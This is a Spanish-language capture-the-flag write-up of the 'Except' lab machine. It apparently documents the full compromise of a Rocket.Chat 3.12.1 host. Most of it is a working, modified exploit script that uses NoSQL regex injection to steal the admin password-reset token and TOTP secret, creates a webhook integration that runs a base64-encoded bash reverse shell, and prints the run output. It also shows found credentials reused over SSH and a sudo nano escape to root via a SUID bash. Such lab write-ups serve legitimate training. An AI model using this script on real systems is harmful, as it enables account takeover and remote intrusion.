---
title: Except - Medium (HS)
permalink: /Except-HS-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
tags:
  - api
  - docker
  - group-abuse
  - group-abuse-adm
  - group-abuse-lxd
  - nmap
  - priv-esc
  - rce
  - sqli
  - ssh
  - sudo-abuse
  - suid-abuse
  - web
  - active directory
  - hacksmarter
---
---
# Recon

```bash 
nmapf 10.1.211.68
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
3000/tcp open   http   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.55 seconds
           Raw packets sent: 190153 (8.367MB) | Rcvd: 40674 (1.627MB)
nmapf:7: command not found: ep
```

## Website 

Por la pagina principal, corre un `chatbot` simple.

![[Pasted image 20260414230030.png]]
### Rabbit hole

Viendo en el codigo fuente del mismo estan declaradas las respuestas predeterminadas de acuerdo al mensaje que le envio.

![[Pasted image 20260414230142.png]]

### Rocket.chat

En el puerto `3000` corre `rocket.chat`. Donde sin credenciales me registre.

![[Pasted image 20260414233313.png]]
### Information disclosure

Viendo en el chat general, se puede ver un mensaje junto con el nombre de uno de los usuarios.

![[Pasted image 20260414233341.png]]
## Shell as rocketchat @container
### API version information

Como corre una API por detrás, envie con `curl` una solicitud a la misma, viendo asi la version de `rocket.chat`.

```bash
[Apr 14, 2026 - 23:34:16 (-03)] exegol-test Except # curl -s -X GET 'http://except.hs:3000/api/info'
{"version":"3.12.1","success":true}
```
### NoSQL Injection to RCE (Unauthenticated)

Buscando por exploit para dicha `version` me encontre el siguiente [enlace](https://www.exploit-db.com/exploits/50108) con un código el cual se aprovecha de una `NoSQL Injection` con RCE en esta version
### PoC script

En mi caso lo tuve que modificar ya que este script, esta hecho para el caso de que no tengamos acceso a ningún usuario de bajos privilegios en la web, que en mi caso si lo tengo porque lo cree, donde por parametro le paso el `name` y la `password` del mismo para que se autentique. Luego con el token del mismo intenta obtener el token del usuario `admin` que en este caso se puede o puedo intuir que es `localh0ste`.

```python
#!/usr/bin/python

import requests
import string
import time
import hashlib
import json
import oathtool
import argparse
import base64

parser = argparse.ArgumentParser(description='RocketChat 3.12.1 RCE')
parser.add_argument('-password', help='user password [ No 2fa ]', required=True)
parser.add_argument('-user', help='username [ No 2fa ]', required=True)
parser.add_argument('-u', help='Low priv user email [ No 2fa ]', required=True)
parser.add_argument('-a', help='Administrator email', required=True)
parser.add_argument('-A', help='Administrator username', required=True)
parser.add_argument('-t', help='URL (Eg: http://rocketchat.local)', required=True)
parser.add_argument('-lhost', help='reverse shell host', required=True)
parser.add_argument('-lport', help='reverse shell port', required=True)
args = parser.parse_args()


username = args.user
password = args.password
adminusername = args.A
adminmail = args.a
lowprivmail = args.u
target = args.t

revshellip = args.lhost
revshellport = args.lport


def forgotpassword(email,url):
	payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"sendForgotPasswordEmail\\",\\"params\\":[\\"'+email+'\\"]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/sendForgotPasswordEmail", data = payload, headers = headers, verify = False, allow_redirects = False)
	print("[+] Password Reset Email Sent")


def resettoken(url):
	u = url+"/api/v1/method.callAnon/getPasswordPolicy"
	headers={'content-type': 'application/json'}
	token = ""

	num = list(range(0,10))
	string_ints = [str(int) for int in num]
	characters = list(string.ascii_uppercase + string.ascii_lowercase) + list('-')+list('_') + string_ints

	while len(token)!= 43:
		for c in characters:
			payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"getPasswordPolicy\\",\\"params\\":[{\\"token\\":{\\"$regex\\":\\"^%s\\"}}]}"}' % (token + c)
			r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
			time.sleep(0.5)
			if 'Meteor.Error' not in r.text:
				token += c
				print(f"Got: {token}")

	print(f"[+] Got token : {token}")
	return token


def changingpassword(url,token):
	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"resetPassword\\",\\"params\\":[\\"'+token+'\\",\\"P@$$w0rd!1234\\"]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/resetPassword", data = payload, headers = headers, verify = False, allow_redirects = False)
	if "error" in r.text:
		exit("[-] Wrong token")
	print("[+] Password was changed !")


def twofactor(url,username,password,adminusername):
	# Authenticating
	sha256pass = hashlib.sha256(password.encode()).hexdigest()
	payload ='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"username\\":\\"'+username+'\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url + "/api/v1/method.callAnon/login",data=payload,headers=headers,verify=False,allow_redirects=False)
	if "error" in r.text:
		exit("[-] Couldn't authenticate")
	data = json.loads(r.text)
	data =(data['message'])
	userid = data[32:49]
	token = data[60:103]
	print(f"[+] Succesfully authenticated as {username}")

	# Getting 2fa code
	cookies = {'rc_uid': userid,'rc_token': token}
	headers={'X-User-Id': userid,'X-Auth-Token': token}
	payload = '/api/v1/users.list?query={"$where"%3a"this.username%3d%3d%3d\''+adminusername+'\'+%26%26+(()%3d>{+throw+this.services.totp.secret+})()"}'
	r = requests.get(url+payload,cookies=cookies,headers=headers)
	code = r.text[46:98]
	print(f"Got the code for 2fa: {code}")
	return code

def admin_token(url,username,password,adminusername):
	# Authenticating
	sha256pass = hashlib.sha256(password.encode()).hexdigest()
	payload ='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"username\\":\\"'+username+'\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url + "/api/v1/method.callAnon/login",data=payload,headers=headers,verify=False,allow_redirects=False)
	if "error" in r.text:
		exit("[-] Couldn't authenticate")
	data = json.loads(r.text)  
	data =(data['message'])
	userid = data[32:49]
	token = data[60:103]
	print(f"[+] Succesfully authenticated as {adminusername}")

	# Getting reset token for admin
	cookies = {'rc_uid': userid,'rc_token': token}
	headers={'X-User-Id': userid,'X-Auth-Token': token}
	payload = '/api/v1/users.list?query={"$where"%3a"this.username%3d%3d%3d\''+adminusername+'\'+%26%26+(()%3d>{+throw+this.services.password.reset.token+})()"}'
	r = requests.get(url+payload,cookies=cookies,headers=headers)
	code = r.text[46:89]
	print(f"Got the reset token: {code}")
	return code


def changingadminpassword(url,token,code):
	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"resetPassword\\",\\"params\\":[\\"'+token+'\\",\\"P@$$w0rd!1234\\",{\\"twoFactorCode\\":\\"'+code+'\\",\\"twoFactorMethod\\":\\"totp\\"}]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/resetPassword", data = payload, headers = headers, verify = False, allow_redirects = False)
	if "403" in r.text:
		exit("[-] Wrong token")

	print("[+] Admin password changed !")


def rce(url,code,cmd,username):
	# Authenticating
	sha256pass = hashlib.sha256(b'P@$$w0rd!1234').hexdigest()
	headers={'content-type': 'application/json'}
	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"totp\\":{\\"login\\":{\\"user\\":{\\"username\\":\\"'+username+'\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}},\\"code\\":\\"'+code+'\\"}}]}"}'
	r = requests.post(url + "/api/v1/method.callAnon/login",data=payload,headers=headers,verify=False,allow_redirects=False)
	if "error" in r.text:
		exit("[-] Couldn't authenticate")
	data = json.loads(r.text)
	data =(data['message'])
	userid = data[32:49]
	token = data[60:103]
	print("[+] Succesfully authenticated as administrator")

	# Creating Integration
	#cmd = f"bash -c \"bash -i >& /dev/tcp/{revshellip}/{revshellport} 0>&1\""
	payload = '{"enabled":true,"channel":"#general","username":"'+username+'","name":"rce","alias":"","avatarUrl":"","emoji":"","scriptEnabled":true,"script":"const require = console.log.constructor(\'return process.mainModule.require\')();\\nconst { exec } = require(\'child_process\');\\nexec(\''+cmd+'\');","type":"webhook-incoming"}'
	cookies = {'rc_uid': userid,'rc_token': token}
	headers = {'X-User-Id': userid,'X-Auth-Token': token}
	r = requests.post(url+'/api/v1/integrations.create',cookies=cookies,headers=headers,data=payload)
	data = r.text
	data = data.split(',')
	token = data[12]
	token = token[9:57]
	_id = data[18]
	_id = _id[7:24]

	# Triggering RCE
	u = url + '/hooks/' + _id + '/' +token
	r = requests.get(u)
	print(r.text)

############################################################

secret = twofactor(target,username,password,adminusername)


## Sending Reset mail
print(f"[+] Resetting {adminmail} password")
forgotpassword(adminmail,target)

## Getting admin reset token through nosql injection authenticated
token = admin_token(target,username,password,adminusername)


## Resetting Password
code = oathtool.generate_otp(secret)
changingadminpassword(target,token,code)

## Authenticating and triggering rce

shell = 'bash -i >& /dev/tcp/'+revshellip+'/'+revshellport+' 0>&1'
enc_rev = base64.b64encode(shell.encode()).decode()
payload = 'echo ' + enc_rev + ' | base64 -d | bash'
#code = oathtool.generate_otp(secret)
rce(target,code,payload,adminusername)
```
### Shell

Ejecute el mismo enviando asi mi shell como el usuario `rocketchat`

```bash
[Apr 15, 2026 - 02:34:47 (-03)] exegol-test Except # python3 rrr.py -password lala123 -user zs1n -u zsln@zsln.com -a localh0ste@exception.local -A localh0ste -t http://except.hs:3000 -lhost 10.200.47.195 -lport 4444
[+] Succesfully authenticated as zs1n
Got the code for 2fa: KIYTUQZKO4YD6ZJYEUWFAMB4OBAU6I3RJBCXMP3UGJHEOOBJGNLQ
[+] Resetting localh0ste@exception.local password
[+] Password Reset Email Sent
[+] Succesfully authenticated as zs1n
Got the reset token: F-KLoZHhf_kb8CsnBiCXjATZtrVEKsPl7EX4E571fS1
[+] Admin password changed !
[+] Succesfully authenticated as administrator
{"success":false}
```

Donde desde mi listener `nc` recibo la misma.

```bash
[Apr 15, 2026 - 02:34:32 (-03)] exegol-test Except # nc -nvlp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:42964.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
rocketchat@9593cc10a7dd:/app/bundle/programs/server$ id
id
uid=65533(rocketchat) gid=65533(rocketchat) groups=65533(rocketchat)
```
## Shell as Ron

Enumere en el directorio raiz del contenedor, y encontre un archivo con las credenciales del usuario `Ron`.

```bash
rocketchat@9593cc10a7dd:/$ cat Backup_db.txt
DATABASE_USER=Ron
DATABASE_PASSWORD=AtentiouSenoU
DATABASE_NAME=chatty
DATABASE_HOST=localhost
```
### Auth

Donde use las mismas para conectarme por `ssh`.

```bash
[Apr 15, 2026 - 00:04:50 (-03)] exegol-test Except # ssh Ron@except.hs
Ron@except.hs's password:
..snip..

Ron@Chatty:~$ cat user.txt
f27d79...
```
## Shell as root
### Sudo privileges

Viendo los privilegios del usuario `Ron` puedo ver que tengo la capacidad de ejecutar el siguiente comando como `root`.

```bash
Ron@Chatty:~$ sudo -l
Matching Defaults entries for Ron on Chatty:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User Ron may run the following commands on Chatty:
    (root) NOPASSWD: /opt/log_inspector/check_log --clean
```
### Nano Binary privesc

Al ejecutarlo, veo que entra en la interfaz de `nano`.

![[Pasted image 20260415000707.png]]
### Shell

Que viendo en [GTFObins](https://gtfobins.org/gtfobins/nano/), puedo abusar del mismo para convertirme en `root`.

En mi caso luego de obtener acceso a la shell del mismo, como es un poco ilegible, le asigne el bit `SUID` a la bash con `chmod u+s /bin/bash`
```bash
                                    [ Executing... ]w# hoami
rootelp          M-F New Buffer   ^S Spell Check   ^J Full Justify  ^V Cut Till End
# idancel        M-\ Pipe Text    ^Y Linter        ^O Formatter     ^Z Suspend
uid=0(root) gid=0(root) groups=0(root)
#
```

Me converti en el mismo.

```bash
Ron@Chatty:~$ bash -p
bash-5.2# id
uid=1000(Ron) gid=1000(Ron) euid=0(root) groups=1000(Ron),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),101(lxd)
```

```bash
bash-5.2# cat root.txt
9443f...
```

`~Happy Hacking.`